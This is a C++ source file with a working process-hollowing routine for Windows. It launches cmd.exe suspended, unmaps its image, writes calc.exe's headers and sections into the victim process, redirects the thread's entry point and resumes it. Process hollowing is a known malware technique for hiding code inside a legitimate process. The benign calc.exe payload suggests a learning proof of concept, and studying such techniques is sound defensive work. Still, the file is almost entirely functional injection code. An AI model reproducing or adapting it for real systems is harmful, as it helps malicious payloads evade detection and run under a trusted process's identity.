#include "Windows.h"
#include "stdio.h"

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

int main() {
	LPSTARTUPINFOA pVicitimStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();
	// Target Image
	LPCSTR victimImage = "cmd.exe";
	LPCSTR replacementImage = "C:\\Windows\\System32\\calc.exe";
	// Create Victim process
	if (!CreateProcessA(0,(LPSTR)victimImage,0,0,0,CREATE_SUSPENDED,0,0,pVicitimStartupInfo, pVictimProcessInfo)) {
		printf("Failed to crete victim process %i\r\n", GetLastError());
		return 1;
	}
	printf("[+]Create victim process PID %i\r\n", pVictimProcessInfo->dwProcessId);

	// Open replacement executable to place inside victim process
	HANDLE hReplacement = CreateFileA(
		replacementImage,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0,
		0
	);
	if (hReplacement == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open replacement executable %i\r\n", GetLastError());
	}
	DWORD replacementSize = GetFileSize(hReplacement, 0);
	// Allocate memory for replacement executable
	PVOID pReplacementImage = VirtualAlloc(
		0,
		replacementSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	// Load it
	DWORD totalBytes;
	if (!ReadFile(
		hReplacement,
		pReplacementImage,
		replacementSize,
		&totalBytes,
		0)){
		printf("[-]Failed to read the replacement executable into an image in memory\r\n");
		return 1;
	}
	CloseHandle(hReplacement);
	CONTEXT victimContext;
	//  Save the complete thread context information
	victimContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pVictimProcessInfo->hThread, &victimContext);
	// Get base address of the victim executable from EBX
	PVOID pVictimImageBaseAddress;
	ReadProcessMemory(
		pVictimProcessInfo->hProcess,
		(PVOID)(victimContext.Ebx + sizeof(SIZE_T) * 2),
		&pVictimImageBaseAddress,
		sizeof(PVOID),
		0
	);

	// Unmap executable image from victim process	
	DWORD unmapResult = NtUnmapViewOfSection(pVictimProcessInfo->hProcess,pVictimImageBaseAddress);
	if (unmapResult) {
		printf("[-] Error unmapping section in victim process\r\n");
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	// Allocate memory for the replacement image in the remote process
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew);
	DWORD replacementImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
	DWORD sizeOfReplacementImage = pNTHeaders->OptionalHeader.SizeOfImage;
	PVOID pVictimHollowedAllocation = VirtualAllocEx(
		pVictimProcessInfo->hProcess,
		(PVOID)pVictimImageBaseAddress,
		sizeOfReplacementImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pVictimHollowedAllocation) {
		printf("[-] Failed to allocate memory in victim process %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	// Write replacement process headers into victim process
	WriteProcessMemory(
		pVictimProcessInfo->hProcess,
		(PVOID)pVictimImageBaseAddress,
		pReplacementImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		0);
	// Write replacement process sections into victim process
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader =
			(PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)
				+ (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pVictimProcessInfo->hProcess,
			(PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			0);
	}

	// Change EAX
	victimContext.Eax = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	SetThreadContext(
		pVictimProcessInfo->hThread,
		&victimContext);
	// Reseum the Process
	ResumeThread(pVictimProcessInfo->hThread);
	// Clean up
	CloseHandle(pVictimProcessInfo->hThread);
	CloseHandle(pVictimProcessInfo->hProcess);
	VirtualFree(pReplacementImage, 0, MEM_RELEASE);
	return 0;
}